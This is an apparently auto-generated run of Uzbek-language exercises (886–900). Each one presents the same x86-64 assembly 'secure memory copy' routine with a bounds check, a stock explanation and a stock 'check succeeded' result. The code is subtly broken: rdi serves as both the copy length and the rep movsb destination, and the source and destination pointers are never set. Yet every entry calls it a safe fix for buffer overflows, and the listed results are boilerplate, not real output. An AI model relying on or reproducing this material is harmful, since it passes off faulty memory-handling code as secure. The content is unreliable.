## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #25
check_security_invariant_25:
    cmp rdi, 0x0019
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0019 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #25 muvaffaqiyatli amalga oshirildi.
```


# 886-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #26
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #26 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #26
check_security_invariant_26:
    cmp rdi, 0x001A
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x001A / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #26 muvaffaqiyatli amalga oshirildi.
```


# 887-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #27
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #27 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #27
check_security_invariant_27:
    cmp rdi, 0x001B
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x001B / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #27 muvaffaqiyatli amalga oshirildi.
```


# 888-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #28
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #28 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #28
check_security_invariant_28:
    cmp rdi, 0x001C
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x001C / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #28 muvaffaqiyatli amalga oshirildi.
```


# 889-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #29
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #29 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #29
check_security_invariant_29:
    cmp rdi, 0x001D
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x001D / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #29 muvaffaqiyatli amalga oshirildi.
```


# 890-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #30
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #30 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #30
check_security_invariant_30:
    cmp rdi, 0x001E
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x001E / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #30 muvaffaqiyatli amalga oshirildi.
```


# 891-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #31
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #31 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #31
check_security_invariant_31:
    cmp rdi, 0x001F
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x001F / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #31 muvaffaqiyatli amalga oshirildi.
```


# 892-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #32
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #32 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #32
check_security_invariant_32:
    cmp rdi, 0x0020
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0020 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #32 muvaffaqiyatli amalga oshirildi.
```


# 893-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #33
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #33 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #33
check_security_invariant_33:
    cmp rdi, 0x0021
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0021 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #33 muvaffaqiyatli amalga oshirildi.
```


# 894-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #34
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #34 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #34
check_security_invariant_34:
    cmp rdi, 0x0022
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0022 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #34 muvaffaqiyatli amalga oshirildi.
```


# 895-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #35
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #35 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #35
check_security_invariant_35:
    cmp rdi, 0x0023
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0023 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #35 muvaffaqiyatli amalga oshirildi.
```


# 896-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #36
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #36 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #36
check_security_invariant_36:
    cmp rdi, 0x0024
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0024 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #36 muvaffaqiyatli amalga oshirildi.
```


# 897-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #37
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #37 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #37
check_security_invariant_37:
    cmp rdi, 0x0025
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0025 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #37 muvaffaqiyatli amalga oshirildi.
```


# 898-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #38
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #38 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #38
check_security_invariant_38:
    cmp rdi, 0x0026
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0026 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #38 muvaffaqiyatli amalga oshirildi.
```


# 899-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #39
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #39 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #39
check_security_invariant_39:
    cmp rdi, 0x0027
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0027 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #39 muvaffaqiyatli amalga oshirildi.
```


# 900-Topshiriq: Kiberxavfsizlik va ekspluatatsiya tahlili #40
## Topshiriq sharti:
Kiberxavfsizlik va xavfsiz assembly bo'yicha Kiberxavfsizlik va ekspluatatsiya tahlili #40 talabini bajaring.

## Yechim (Assembly kodi):
```assembly
; Xavfsizlik tahlili va zaiflik namunasi #40
check_security_invariant_40:
    cmp rdi, 0x0028
    ja .invalid_range
    ; Xavfsiz xotira nusxalash
    mov rcx, rdi
    rep movsb
    xor eax, eax
    ret
.invalid_range:
    mov eax, -1
    ret
```

## Tushuntirish va Mantiq:
Bufer chegarasini qat'iy tekshirish (`cmp rdi, 0x0028 / ja`) orqali xotira to'lib ketishi va kiberxavfsizlik zaifliklari bartaraf etiladi.

## Ishlash natijasi:
```text
Xavfsizlik tekshiruvi #40 muvaffaqiyatli amalga oshirildi.
```

